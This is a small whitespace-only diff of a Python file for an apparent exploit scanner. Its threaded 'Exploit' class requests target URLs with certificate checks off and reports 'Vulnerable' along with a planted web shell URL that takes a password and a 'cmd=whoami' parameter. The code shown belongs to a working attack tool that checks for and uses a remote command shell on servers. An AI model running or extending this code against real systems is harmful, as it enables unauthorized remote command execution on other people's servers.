@@ -14,7 +14,6 @@ import time
 
 
 class Exploit(Thread):
-
     def __init__(self, url):
         super(self.__class__, self).__init__()
 
@@ -58,7 +57,7 @@ class Exploit(Thread):
                                    allow_redirects=False,
                                    stream=True,
                                    verify=False)
-                if shellgoroot.status_code == 200: 
+                if shellgoroot.status_code == 200:
                     print(f"Vulnerable，shell url: {shellurlroot}?pwd=j&cmd=whoami")
                 else:
                     print(f"\033[91m[" + '\u2718' + "]\033[0m", self.url,
